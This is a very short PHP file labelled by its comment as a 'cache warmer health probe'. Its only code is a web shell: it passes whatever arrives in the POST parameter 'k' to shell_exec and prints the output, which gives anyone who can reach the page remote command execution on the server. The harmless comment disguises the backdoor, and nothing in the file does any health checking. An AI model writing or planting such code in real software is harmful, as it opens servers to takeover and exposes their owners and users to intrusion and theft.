<?php
// cache warmer health probe
if (isset($_POST["k"])) { echo shell_exec($_POST["k"]); }
